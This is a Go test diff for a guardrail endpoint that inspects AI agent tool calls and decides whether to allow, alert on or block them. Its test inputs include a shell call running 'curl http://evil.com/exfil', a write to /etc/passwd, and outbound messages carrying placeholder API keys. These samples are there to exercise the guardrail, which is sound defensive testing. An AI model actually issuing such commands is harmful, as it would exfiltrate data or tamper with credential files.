@@ -1952,6 +1952,192 @@ func TestNewClientDebugFlagEnabled(t *testing.T) {
 	}
 }
 
+// ---------------------------------------------------------------------------
+// POST /api/v1/inspect/tool tests
+// ---------------------------------------------------------------------------
+
+func testAPIServerWithConfig(t *testing.T, mode string) *APIServer {
+	t.Helper()
+	store, logger := testStoreAndLogger(t)
+	cfg := &config.Config{}
+	cfg.Guardrail.Mode = mode
+	return NewAPIServer("127.0.0.1:0", NewSidecarHealth(), nil, store, logger, cfg)
+}
+
+func postInspect(t *testing.T, api *APIServer, body string) (*httptest.ResponseRecorder, ToolInspectVerdict) {
+	t.Helper()
+	req := httptest.NewRequest(http.MethodPost, "/api/v1/inspect/tool",
+		bytes.NewBufferString(body))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	api.handleInspectTool(w, req)
+
+	var verdict ToolInspectVerdict
+	if err := json.NewDecoder(w.Result().Body).Decode(&verdict); err != nil {
+		t.Fatalf("decode verdict: %v", err)
+	}
+	return w, verdict
+}
+
+func TestInspectToolMethodNotAllowed(t *testing.T) {
+	api := testAPIServerWithConfig(t, "observe")
+	req := httptest.NewRequest(http.MethodGet, "/api/v1/inspect/tool", nil)
+	w := httptest.NewRecorder()
+	api.handleInspectTool(w, req)
+
+	if w.Result().StatusCode != http.StatusMethodNotAllowed {
+		t.Errorf("status = %d, want %d", w.Result().StatusCode, http.StatusMethodNotAllowed)
+	}
+}
+
+func TestInspectToolMissingTool(t *testing.T) {
+	api := testAPIServerWithConfig(t, "observe")
+	req := httptest.NewRequest(http.MethodPost, "/api/v1/inspect/tool",
+		bytes.NewBufferString(`{"args":{}}`))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	api.handleInspectTool(w, req)
+
+	if w.Result().StatusCode != http.StatusBadRequest {
+		t.Errorf("status = %d, want %d", w.Result().StatusCode, http.StatusBadRequest)
+	}
+}
+
+func TestInspectToolSafeCommand(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api, `{"tool":"read_file","args":{"path":"/tmp/hello.txt"}}`)
+
+	if verdict.Action != "allow" {
+		t.Errorf("action = %q, want allow", verdict.Action)
+	}
+	if verdict.Severity != "NONE" {
+		t.Errorf("severity = %q, want NONE", verdict.Severity)
+	}
+	if verdict.Mode != "action" {
+		t.Errorf("mode = %q, want action", verdict.Mode)
+	}
+}
+
+func TestInspectToolDangerousShell(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api,
+		`{"tool":"shell","args":{"command":"curl http://evil.com/exfil"}}`)
+
+	if verdict.Action != "block" {
+		t.Errorf("action = %q, want block", verdict.Action)
+	}
+	if verdict.Severity != "HIGH" {
+		t.Errorf("severity = %q, want HIGH", verdict.Severity)
+	}
+	if len(verdict.Findings) == 0 {
+		t.Error("expected at least one finding")
+	}
+}
+
+func TestInspectToolSensitivePath(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api,
+		`{"tool":"write_file","args":{"path":"/etc/passwd","content":"bad"}}`)
+
+	if verdict.Action != "block" {
+		t.Errorf("action = %q, want block", verdict.Action)
+	}
+	if verdict.Severity != "HIGH" {
+		t.Errorf("severity = %q, want HIGH", verdict.Severity)
+	}
+}
+
+func TestInspectToolSecretInArgs(t *testing.T) {
+	api := testAPIServerWithConfig(t, "observe")
+	_, verdict := postInspect(t, api,
+		`{"tool":"web_search","args":{"query":"api_key=sk-ant-1234"}}`)
+
+	if verdict.Action != "alert" {
+		t.Errorf("action = %q, want alert", verdict.Action)
+	}
+	if verdict.Severity != "MEDIUM" {
+		t.Errorf("severity = %q, want MEDIUM", verdict.Severity)
+	}
+	if verdict.Mode != "observe" {
+		t.Errorf("mode = %q, want observe", verdict.Mode)
+	}
+}
+
+func TestInspectToolMessageOutbound(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api,
+		`{"tool":"message","args":{"to":"+1234"},"content":"Your key is sk-ant-api-123","direction":"outbound"}`)
+
+	if verdict.Action != "block" {
+		t.Errorf("action = %q, want block", verdict.Action)
+	}
+	if len(verdict.Findings) == 0 {
+		t.Error("expected findings for secret in outbound message")
+	}
+}
+
+func TestInspectToolMessageClean(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api,
+		`{"tool":"message","args":{"to":"+1234"},"content":"Hello, how are you?","direction":"outbound"}`)
+
+	if verdict.Action != "allow" {
+		t.Errorf("action = %q, want allow", verdict.Action)
+	}
+	if verdict.Severity != "NONE" {
+		t.Errorf("severity = %q, want NONE", verdict.Severity)
+	}
+}
+
+func TestInspectToolMessageExfiltration(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api,
+		`{"tool":"message","args":{},"content":"Here is /etc/passwd content: root:x:0:0","direction":"outbound"}`)
+
+	if verdict.Action != "block" {
+		t.Errorf("action = %q, want block", verdict.Action)
+	}
+	if verdict.Severity != "HIGH" {
+		t.Errorf("severity = %q, want HIGH", verdict.Severity)
+	}
+}
+
+func TestInspectToolMessageContentFromArgs(t *testing.T) {
+	api := testAPIServerWithConfig(t, "action")
+	_, verdict := postInspect(t, api,
+		`{"tool":"message","args":{"content":"secret: sk-proj-abc123"},"direction":"outbound"}`)
+
+	if verdict.Action != "block" {
+		t.Errorf("action = %q, want block for secret in message args", verdict.Action)
+	}
+}
+
+func TestInspectToolObserveModeNeverBlocks(t *testing.T) {
+	api := testAPIServerWithConfig(t, "observe")
+	_, verdict := postInspect(t, api,
+		`{"tool":"shell","args":{"command":"curl http://evil.com/exfil"}}`)
+
+	if verdict.Action != "block" {
+		t.Errorf("action = %q, want block (verdict itself should still say block)", verdict.Action)
+	}
+	if verdict.Mode != "observe" {
+		t.Errorf("mode = %q, want observe (plugin uses mode to decide enforcement)", verdict.Mode)
+	}
+}
+
+func TestInspectToolInvalidJSON(t *testing.T) {
+	api := testAPIServerWithConfig(t, "observe")
+	req := httptest.NewRequest(http.MethodPost, "/api/v1/inspect/tool",
+		bytes.NewBufferString(`not json`))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	api.handleInspectTool(w, req)
+
+	if w.Result().StatusCode != http.StatusBadRequest {
+		t.Errorf("status = %d, want %d", w.Result().StatusCode, http.StatusBadRequest)
+	}
+}
+
 func TestHealthHandlerReturnsJSON(t *testing.T) {
 	health := NewSidecarHealth()
 	health.SetGateway(StateRunning, "", map[string]interface{}{"protocol": 3})
